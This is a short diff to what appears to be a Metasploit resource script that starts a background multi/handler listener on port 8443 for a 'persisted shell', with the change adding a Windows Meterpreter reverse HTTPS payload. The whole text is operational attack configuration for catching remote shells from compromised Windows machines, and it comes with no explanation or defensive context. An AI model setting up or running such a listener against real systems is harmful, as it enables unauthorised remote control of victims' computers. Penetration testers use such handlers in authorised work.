@@ -1,6 +1,7 @@
 #this will enable a listener for the persisted shell
 use exploit/multi/handler
 
+set payload windows/meterpreter/reverse_https
 set LPORT 8443
 
 exploit -j
